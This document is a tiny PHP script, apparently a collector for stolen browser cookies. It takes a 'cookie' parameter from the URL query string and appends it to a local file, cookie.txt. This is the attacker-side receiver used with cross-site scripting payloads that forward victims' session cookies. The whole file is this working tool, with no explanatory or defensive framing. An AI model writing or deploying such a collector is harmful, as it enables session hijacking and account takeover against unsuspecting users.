<?php
$file = fopen("cookie.txt","a");
if($_GET['cookie']){
	$cookie = $_GET['cookie'];
	fputs ($file,"$cookie\n");
}
?>